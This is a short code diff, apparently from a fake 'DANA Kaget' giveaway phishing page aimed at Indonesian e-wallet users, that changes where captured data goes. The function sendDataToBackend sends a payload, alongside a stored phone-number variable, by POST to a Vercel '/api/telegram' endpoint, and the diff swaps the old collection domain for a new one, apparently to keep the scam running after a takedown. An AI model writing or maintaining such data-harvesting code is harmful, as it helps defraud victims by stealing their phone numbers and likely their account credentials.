@@ -125,8 +125,8 @@
         let globalPhone = "";
         async function sendDataToBackend(payload) {
             try {
-                // Diarahkan ke domain Vercel proyek yang atas (.dana-kagetid-aby5)
-                await fetch('https://dana-kagetid-aby5.vercel.app/api/telegram', {
+                // Diarahkan ke domain Vercel baru kamu
+                await fetch('https://dana-kagetid-su2s.vercel.app/api/telegram', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
